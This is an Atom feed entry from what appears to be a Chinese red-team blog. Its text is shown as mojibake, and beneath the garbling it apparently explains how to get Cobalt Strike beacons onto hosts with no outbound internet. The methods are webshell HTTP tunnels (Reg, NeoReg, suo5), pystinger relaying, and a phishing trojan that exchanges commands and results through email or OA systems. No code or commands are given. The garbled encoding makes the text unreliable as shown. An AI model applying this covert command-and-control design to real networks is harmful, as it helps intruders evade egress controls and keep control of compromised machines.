    <link href="https://cyxsec.github.io/2022/07/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BFC2/"/>
    <id>https://cyxsec.github.io/2022/07/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BFC2/</id>
    <published>2022-07-05T03:16:57.000Z</published>
    <updated>2024-07-22T08:44:45.466Z</updated>
    
    <content type="html"><![CDATA[<p>å…ˆç®€å•å¸¦ä¸€ä¸‹å¸¸è§çš„æ­£å‘HTTPéš§é“</p><h2 id="0x01æ­£å‘httpéš§é“"><a class="markdownIt-Anchor" href="#0x01æ­£å‘httpéš§é“"></a> 0x01æ­£å‘HTTPéš§é“</h2><p>è¿™ç§æ–¹å¼åº”ç”¨èŒƒå›´å¾ˆå¹¿ï¼Œæœ‰webshellçš„æƒ…å†µä¸‹éƒ½æ”¯æŒæ­¤æ–¹å¼</p><h3 id="åŸç†"><a class="markdownIt-Anchor" href="#åŸç†"></a> åŸç†</h3><p>é¡µé¢ä¸Šå­˜åœ¨æˆç†Ÿçš„å·¥å…·Regã€NeoRegã€suo5ç­‰</p><p>åŸç†å¤§æ¦‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼šï¼ˆè¿™é‡Œç›´æ¥æ‹¿Viperä½œè€…çš„å›¾æ¥è¯´äº†ï¼‰</p><p><img src="../../../typora-user-images/image-20240709180051975.png" alt="image-20240709180051975" /></p><ul><li><p>clientè¿è¡Œåœ¨äº’è”ç½‘çš„vpsä¸Šï¼Œå¼€å¯ç«¯å£ç›‘å¬å¤„ç†proxychainsè½¬å‘çš„tcpè¿æ¥ã€‚ï¼ˆclientå¯¹åº”çš„å°±æ˜¯regçš„æœ¬åœ°pythonè„šæœ¬å’Œsuo5çš„å®¢æˆ·ç«¯ï¼‰</p></li><li><p>clinetä»tcpè¿æ¥ä¸­è¯»å–æ•°æ®ï¼Œå°†æ•°æ®å­˜å‚¨åœ¨postè¯·æ±‚ä¸­å‘é€åˆ°webshellã€‚</p></li><li><p>webshellå°†httpè¯·æ±‚è§£æå¹¶è¿›è¡Œè½¬å‘ã€‚ï¼ˆwebshellé›†æˆäº†ä¸Šå›¾ä¸­çš„server)</p></li></ul><p>suo5å…¶å®å®ç°äº†åŸºæœ¬å…¨åŒå·¥çš„æ¨¡å¼ï¼Œè¿™ä¸ªé—®é¢˜åé¢æœ‰ç©ºå†ç ”ç©¶ã€‚</p><h2 id="0x02ä¸å‡ºç½‘ä¸Šçº¿csåœºæ™¯"><a class="markdownIt-Anchor" href="#0x02ä¸å‡ºç½‘ä¸Šçº¿csåœºæ™¯"></a> 0x02ä¸å‡ºç½‘ä¸Šçº¿CSåœºæ™¯</h2><p>CSçš„beaconåªèƒ½åå‘è¿æ¥ï¼Œä¸å‡ºç½‘çš„æƒ…å†µä¸‹æ— æ³•ç›´æ¥åå‘è¿æ¥å¤–ç½‘vps</p><p>å…¶å®ä¹Ÿå¯ä»¥åˆ©ç”¨ä¸­è½¬çš„æ–¹å¼è¿›è¡Œä¸Šçº¿</p><h3 id="åŸç†-2"><a class="markdownIt-Anchor" href="#åŸç†-2"></a> åŸç†</h3><p>æˆç†Ÿçš„å·¥å…·ï¼špystingerï¼ˆæ¯’åˆºï¼‰</p><p>åŸç†å¤§æ¦‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼šï¼ˆè¿™é‡Œç›´æ¥æ‹¿Viperä½œè€…çš„å›¾æ¥è¯´äº†ï¼‰</p><p><img src="../../../typora-user-images/image-20240709180109508.png" alt="image-20240709180109508" /></p><p>serverç«¯ï¼š</p><ul><li>beaconå°†httpè¯·æ±‚(å‡è®¾æ•°æ®ä¸ºAAAAAA)å‘é€åˆ°serverã€‚</li><li>serverå°†(AAAAAA)å­˜å‚¨åˆ°ç¼“å­˜ï¼Œå¹¶ä¿æŒä¸beaconçš„httpè¿æ¥ã€‚</li></ul><p>clientç«¯ï¼š</p><ul><li>è¯·æ±‚webshellã€‚</li><li>webshellè½¬å‘è¯·æ±‚åˆ°serverã€‚</li><li>serverå°†ç¼“å­˜çš„(AAAAA)å¡«å……åˆ°httpåº”ç­”ä¸­ã€‚</li><li>webshellå°†serverçš„åº”ç­”è½¬å‘ç»™clientã€‚</li><li>clientä»åº”ç­”ä¸­è·å–æ•°æ®(AAAAA)ã€‚</li><li>clientä¸cobaltstikeçš„listenerå»ºç«‹tcpè¿æ¥ã€‚</li><li>clientå‘é€(AAAAA)åˆ°cobaltstrikeçš„listenerã€‚</li><li>conbaltstrikeå‘é€åº”ç­”æ•°æ®(BBBBBB)ã€‚</li><li>clientå°†æ•°æ®(BBBBB)å°è£…åˆ°httpè¯·æ±‚ä¸­,é€šè¿‡webshellè½¬å‘åˆ°serverã€‚</li><li>serveré€šè¿‡ä¹‹å‰ä¿æŒçš„httpè¿æ¥å°†(BBBBBB)å‘é€åˆ°beaconã€‚</li></ul><p>å®é™…çš„æµç¨‹å°±æ˜¯æ•°æ®åŒ…çš„è½¬æ¢å’Œè½¬å‘ï¼Œç†è§£å®Œä¸Šé¢çš„æ­£å‘ï¼Œåå‘çš„é€»è¾‘åªæ˜¯å¢åŠ äº†ä¸€ä¸ªç›‘å¬è€Œå·²ã€‚</p><p>å¯èƒ½ä¼šæœ‰äººæœ‰è¿™æ ·çš„é—®é¢˜ï¼š<strong>è¿™é‡Œçš„webshellå¯ä»¥ç±»ä¼¼regæŠŠserverä¹Ÿæ•´åˆä¸€ä¸‹å—ï¼Œä¸è½åœ°serverï¼Ÿ</strong></p><p>ç­”æ¡ˆæ˜¯ä¸è¡Œçš„ï¼ŒåŒºåˆ«äºæ­£å‘è¿æ¥ï¼Œåå‘è¿æ¥æ—¶éœ€è¦ç›‘å¬ç«¯å£ï¼Œwebshellæ˜¯æ— æ³•åšåˆ°çš„ï¼Œæ‰€ä»¥ä½¿ç”¨æ¯’åˆºçš„æ—¶å€™ï¼Œä¸å‡ºç½‘çš„æœºå™¨éœ€è¦è½åœ°ä¸¤ä¸ªæ–‡ä»¶ï¼ˆwebshellã€serverï¼‰</p><h2 id="0x03å®æˆ˜é’“é±¼ä¸å‡ºç½‘ä¸Šçº¿"><a class="markdownIt-Anchor" href="#0x03å®æˆ˜é’“é±¼ä¸å‡ºç½‘ä¸Šçº¿"></a> 0x03å®æˆ˜é’“é±¼ä¸å‡ºç½‘ä¸Šçº¿</h2><p>æ ¹æ®ä¸Šé¢çš„ä¸å‡ºç½‘ä¸Šçº¿csæ¡ˆä¾‹è§£é‡Šï¼Œå…¶å®ä¸»è¦åšçš„å°±æ˜¯æµé‡è½¬å‘å’Œæ ¼å¼åŒ–</p><p>æ ¼å¼åŒ–çš„éƒ¨åˆ†å°±æ˜¯æ¯’åˆºçš„clientå’Œserveråœ¨åšï¼Œä½†æ˜¯è¿™æ ·ä¼šåœ¨webshellçš„æœºå™¨ä¸Šè½åœ°severçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼ŒåŒæ—¶éœ€è¦å¼€å¯ç›‘å¬ï¼Œä¸å¤Ÿopsecã€‚</p><p>ä¸å¦¨æŠŠæ€è·¯å‘æ•£ä¸€ä¸‹ï¼šæœ‰æ²¡æœ‰å¯èƒ½æŠŠserverå’Œc2é©¬ç»‘åœ¨ä¸€èµ·å‘¢ï¼Ÿæˆ–è€…æ¢å¥è¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥é‡æ–°å†™æˆ‘ä»¬çš„c2é©¬ï¼Œç›´æ¥æŠŠç»“æœå†™å…¥åˆ°webshellç¼“å­˜ä¸­ï¼Œc2çš„æ§åˆ¶ç«¯ä¼šè¯·æ±‚webshellè·å–ç¼“å­˜è¯»å–ç»“æœï¼Œå°±å®Œæˆäº†ä¸å‡ºç½‘çš„ä¸Šçº¿æµç¨‹ã€‚</p><p>è¿™ä¸ªæ¡ˆä¾‹å…¶å®ä¹‹å‰é¡¹ç›®é‡è§è¿‡ï¼š</p><p><strong>é’“é±¼çš„æ—¶å€™ï¼Œæœºå™¨ä¸å‡ºç½‘å¦‚ä½•ä¸Šçº¿ï¼Ÿï¼Ÿ</strong></p><p>æ‰¾å†…å¤–ç½‘å¯èƒ½äº’é€šçš„ä¸šåŠ¡ï¼šé‚®ä»¶ç³»ç»Ÿã€OAç³»ç»Ÿç­‰ï¼ˆå¯èƒ½éœ€è¦è´¦å·ï¼Œä½†æ˜¯è¿™äº›ç³»ç»Ÿå¤§æ¦‚ç‡å†…å¤–ç½‘æ˜¯äº’é€šçš„ï¼‰ï¼Œæˆ–è€…ç›´æ¥æ‘†çƒ‚ï¼Œæ‰¾èƒ½åšæ•°æ®äº¤äº’çš„ç³»ç»ŸåŸŸåï¼Œæ‰¹é‡éƒ½è¯•ä¸€ä¸‹ã€‚</p><p>å¯¹åº”æˆ‘ä»¬ä¸Šé¢çš„æ€è·¯ï¼Œé‡æ–°è®¾è®¡æˆ‘ä»¬çš„c2é©¬å’ŒæœåŠ¡ç«¯ï¼Œæˆ–è€…æ²¡é‚£ä¹ˆéº»çƒ¦ï¼Œè‡ªå·±å†™ä¸€ä¸ªèƒ½æ‰§è¡Œå‘½ä»¤ã€æ–‡ä»¶ä¸Šä¼ å’Œè¯»å–çš„é©¬å°±å¯ä»¥äº†ã€‚</p><p>æœ¨é©¬ï¼š</p><ul><li><p>å®šæ—¶è¯»å–é‚®ä»¶ã€OAç³»ç»Ÿæˆ–è€…å…¶ä»–èƒ½å­˜å‚¨æ•°æ®çš„ç³»ç»Ÿçš„æ•°æ®ã€‚ï¼ˆå¦‚é‚®ä»¶å†…å®¹ï¼Œç³»ç»Ÿç¼–è¾‘å†…å®¹ã€oaèŠå¤©è®°å½•ç­‰ç­‰ï¼‰ï¼Œä½œä¸ºå‘½ä»¤è¾“å…¥ã€‚</p></li><li><p>è·å–å‘½ä»¤è¾“å…¥åå°†æ‰§è¡Œç»“æœå†™å…¥å¯¹åº”ç³»ç»Ÿã€‚</p></li></ul><p>å› ä¸ºå†…å¤–ç½‘ç³»ç»Ÿäº’é€š</p><p>c2æ§åˆ¶ç«¯ï¼š</p><ul><li>å°†æƒ³æ‰§è¡Œçš„å‘½ä»¤å†™å…¥åˆ°å¤–ç½‘ç³»ç»Ÿï¼Œä¾›æœ¨é©¬è¯»å–</li><li>å°†æœ¨é©¬æ‰§è¡Œç»“æœè¯»å–å¹¶å“åº”</li></ul><p>å®æˆ˜åº”ç”¨çš„è¯ï¼Œå…¶å®è¿˜æ˜¯å¯ä»¥ç”¨çš„ã€‚</p><p>æœºå™¨ä¸å‡ºç½‘çš„è¯ï¼Œè‚¯å®šä¼šé…å†…éƒ¨dnsï¼Œæ‰€ä»¥å»å¤–ç½‘æ‰¾å¯ä»¥å­˜å‚¨æ•°æ®çš„ç³»ç»ŸåŸŸåï¼Œå†™æœ¨é©¬çš„æ—¶å€™åŠ ä¸Šæ‰¹é‡çš„é€»è¾‘if elseå°è¯•æ‰€æœ‰å¯èƒ½çš„åŸŸåï¼Œä¿è¯ç¨³å®šè·å–ç»“æœå°±å¯ä»¥äº†ã€‚</p><p>å‚è€ƒè¿æ¥ï¼š</p><p>ï¼ˆçº¢é˜Ÿæ”»é˜²å®è·µï¼šä¸å‡ºç½‘ä¸»æœºæ­å»ºå†…ç½‘éš§é“æ–°æ€è·¯ï¼‰<a href="https://mp.weixin.qq.com/s/WzXztQoiqBec-y23dRj0ww">https://mp.weixin.qq.com/s/WzXztQoiqBec-y23dRj0ww</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å…ˆç®€å•å¸¦ä¸€ä¸‹å¸¸è§çš„æ­£å‘HTTPéš§é“&lt;/p&gt;
&lt;h2 id=&quot;0x01æ­£å‘httpéš§é“&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#0x01æ­£å‘httpéš§é“&quot;&gt;&lt;/a&gt; 0x01æ­£å‘HTTPéš§é“&lt;/h2&gt;
&lt;p&gt;è¿™ç§æ–¹å¼åº”ç”¨èŒƒå›´å¾ˆå¹¿ï¼Œæœ‰websh</summary>
      
    
    
    
    
    <category term="ä¸å‡ºç½‘åˆ©ç”¨" scheme="https://cyxsec.github.io/tags/%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
</feed>
